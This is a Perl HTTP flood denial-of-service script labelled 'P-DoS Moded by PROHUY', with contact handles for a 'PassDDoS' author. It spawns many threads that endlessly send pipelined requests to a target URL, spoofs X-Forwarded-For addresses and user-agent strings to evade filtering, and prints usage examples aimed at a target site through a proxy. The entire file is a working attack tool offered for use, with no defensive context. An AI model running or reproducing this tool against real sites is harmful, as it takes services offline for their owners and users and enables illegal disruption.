#!/usr/bin/perl

#~> [-------------------------------] <~#
#~> [ Contact: passddos@gmail.com   ] <~#
#~> [ YouTube: bit.ly/2PDXYZ        ] <~#
#~> [ Discord: PassDDoS#6595        ] <~#
#~> [-------------------------------] <~#

package control;

my $ip;

sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=255) {$b=0;$o++;}
if($o>=255) {$o=0;$e++;}
if($e>=255) {$e=0;$a++;}
die("[!] No mas IPs!\n") if($a>=255);
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}

1;

package main;

use Socket;
use IO::Socket::INET;
use threads ('yield', 
	'exit' => 'threads_only',
	'stringify');
use threads::shared;
my $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36";
my $ua = "EmailWolf 1.00",
my $ua = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
my $ua = "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
my $ua = "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
my $ua = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
my $ua = "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
my $ua = "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
my $ua = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
my $ua =  "everyfeed-spider/2.0 (http://www.everyfeed.com)",
my $ua ="facebookscraper/1.0( http://www.facebook.com/sharescraper_help.php)",
my $ua ="FAST-WebCrawler/3.8 (crawler at trd dot overture dot com; http://www.alltheweb.com/help/webmaster/crawler)",
my $ua ="FeedFetcher-Google; ( http://www.google.com/feedfetcher.html)",
my $ua ="Gaisbot/3.0 (robot@gais.cs.ccu.edu.tw; http://gais.cs.ccu.edu.tw/robot.php)",
my $ua ="Googlebot/2.1 ( http://www.googlebot.com/bot.html)",
my $ua ="Googlebot-Image/1.0",
my $ua ="Googlebot-News",
my $ua ="Gregarius/0.5.2 ( http://devlog.gregarius.net/docs/ua)",
my $ua ="grub-client-1.5.3; (grub-client-1.5.3; Crawl your own stuff with http://grub.org)",
my $ua ="Gulper Web Bot 0.2.4 (www.ecsl.cs.sunysb.edu/~maxim/cgi-bin/Link/GulperBot)",
my $ua = "HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5  (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1",
my $ua ="HTC-ST7377/1.59.502.3 (67150) Opera/9.50 (Windows NT 5.1; U; en) UP.Link/6.3.1.17.0",
my $ua ="HTMLParser/1.6",
my $ua = "iTunes/4.2 (Macintosh; U; PPC Mac OS X 10.2)",
my $ua = "iTunes/9.0.2 (Windows; N)",
my $ua = "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)",
my $ua = "Java/1.6.0_13",
my $ua = "Jigsaw/2.2.5 W3C_CSS_Validator_JFouffa/2.0",
my $ua = "Konqueror/3.0-rc4; (Konqueror/3.0-rc4; i686 Linux;;datecode)",
my $ua = "LG-GC900/V10a Obigo/WAP2.0 Profile/MIDP-2.1 Configuration/CLDC-1.1",
my $ua = "LG-LX550 AU-MIC-LX550/2.0 MMP/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
my $ua = "libwww-perl/5.820",
my $ua = "Links/0.9.1 (Linux 2.4.24; i386;)",
my $ua = "Links (2.1pre15; FreeBSD 5.3-RELEASE i386; 196x84)",
my $ua = "Links (2.1pre15; Linux 2.4.26 i686; 158x61)",
my $ua = "Links (2.3pre1; Linux 2.6.38-8-generic x86_64; 170x48)",
my $ua = "Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/0.8.12",
my $ua = "Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d",
my $ua ="Mediapartners-Google",
my $ua ="Microsoft URL Control - 6.00.8862",
my $ua ="Midori/0.1.10 (X11; Linux i686; U; en-us) WebKit/(531).(2) ",
my $ua ="MOT-L7v/08.B7.5DR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
my $ua ="MOTORIZR-Z8/46.00.00 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 356) Opera 8.65 [it] UP.Link/6.3.0.0.0",
my $ua ="MOT-V177/0.1.75 UP.Browser/6.2.3.9.c.12 (GUI) MMP/2.0 UP.Link/6.3.1.13.0",
my $ua ="MOT-V9mm/00.62 UP.Browser/6.2.3.4.c.1.123 (GUI) MMP/2.0",
my $ua =  "Mozilla/1.22 (compatible; MSIE 5.01; PalmOS 3.0) EudoraWeb 2.1",
my $ua =  "Mozilla/2.02E (Win95; U)",
my $ua =  "Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
my $ua =  "Mozilla/3.01Gold (Win95; I)",
my $ua =  "Mozilla/3.0 (compatible; NetPositive/2.1.1; BeOS)",
my $ua =  "Mozilla/4.0 (compatible; GoogleToolbar 4.0.1019.5266-big; Windows XP 5.1; MSIE 6.0.2900.2180)",
my $ua = "Mozilla/4.0 (compatible; Linux 2.6.22) NetFront/3.4 Kindle/2.0 (screen 600x800)",
my $ua ="Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
my $ua ="Mozilla/4.0 (compatible; MSIE 5.0; Series80/2.0 Nokia9500/4.51 Profile/MIDP-2.0 Configuration/CLDC-1.1)",
my $ua ="Mozilla/4.0 (compatible; MSIE 5.15; Mac_PowerPC)",
my $ua ="Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; Win 9x 4.90)",
my $ua ="Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0 )",
my $ua ="Mozilla/4.0 (compatible; MSIE 6.0; j2me) ReqwirelessWeb/3.5",
my $ua ="Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; PalmSource/hspr-H102; Blazer/4.0) 16;320x320",
my $ua ="Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.12; Microsoft ZuneHD 4.3)",
my $ua ="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0",
my $ua ="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
my $ua ="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
my $ua ="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; winfx; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Zune 2.0) ",
my $ua ="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
my $ua ="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0)",
my $ua ="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/5.0)",
my $ua ="Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0)",
my $hilo;
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z',0,1,2,3,4,5,6,7,8,9);
my $randsemilla = "";
for($i = 0; $i < 30; $i++) {
    $randsemilla .= $vals[int(rand($#vals))];
}
sub socker {
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('tcp');
    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
    connect(SOCK, $paddr) || return false;
    return SOCK;
}

sub sender {
    my ($connection,$puerto,$host,$file) = @_;
    my $sock;
	my $string;
for (0..7) { $string .= chr( int(rand(25) + 65) ); }

    while(true) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            print "[+] Requests From @ $ipinicial\n";
            sleep(1);
            next;
        }
        for($i=0;$i<$threads_connection;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
			$paquete .= join "" ,$method, " ",$filepath, " HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\nX-Forwarded-For: ",int(rand(255)+1),".",int(rand(255)+1),".",int(rand(255)+1),".",int(rand(255)+1),"\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        print $sock $paquete;
    }
}

sub sender2 {
    my ($puerto,$host,$paquete) = @_;
    my $sock;
    my $sumador :shared;
    while(true) {
        $sock = &socker($host,$puerto);
        unless($sock) {
            print "\n[X] Unable to connect...\n\n";
            next;
        }
        print $sock $paquete;
    }
}

sub comenzar {
    $SIG{'KILL'} = sub { print "[!] Killed...\n"; threads->exit(); };
	# http.pl http://target.com 99999999 1000 50.246.120.125:8080 
    $url = $ARGV[0];                # URL
    $connection = $ARGV[1];         # Connection
    $threads_connection = $ARGV[2]; # Threads
	$method = $ARGV[3];             # Method
    $ipfake = $ARGV[4];             # Proxy
    if($threads_connection < 1) {
        print "[-] Invalid [url] [connection] [threads] [proxy]\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        $url .= "/" if($url =~ /^https?:\/\/([\d\w\:\.-]*)$/);;
		($host,$file) = ($url =~ /^https?:\/\/(.*?)\/(.*)/);
    } else {
		$url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
		($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
	}
	$puerto = 80;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
    $file = "/".$file if($file !~ /^\//);
    print join "","[+] Target    : ",$host,":",$puerto,"\n";
	print join "","[+] Path      : ",$method," ",$file,"\n";
	print join "","[+] Proxy     : ",$ipfake,"\n";
	print join "","[+] Connection: ",$connection,"\n";
	print join "","[+] Threads   : ",$threads_connection,"\n\n";
    if($ipfake eq "") {
        my $paquetebase = join "",$method," ",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        $paquetesender = "";
        $paquetesender = $paquetebase x $threads_connection;
        $paquetesender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        for($v=0;$v<$connection;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
        }
    } else {
        $sumador = control->new($ipfake);
        for($v=0;$v<$connection;$v++) {
            $thr[$v] = threads->create('sender', ($threads_connection,$puerto,$host,$file));
        }
    }
    print "[!] Loading...\n";
    for($v=0;$v<$connection;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
        }
    }
    print "[!] Finished!\n";
}

if($#ARGV > 3) {
    comenzar();
} else {
    print("
[+]---------------------------------------------------------------[+]
                   P-DoS  Moded by PROHUY                   
[+]---------------------------------------------------------------[+]
--> Use: pdos.pl [Url] [Connection] [Threads] [GET/POST/HEAD] [Proxy]
--> Ex : pdos.pl http://target.com 9999 1000 GET 82.137.250.145:8080\n");
}
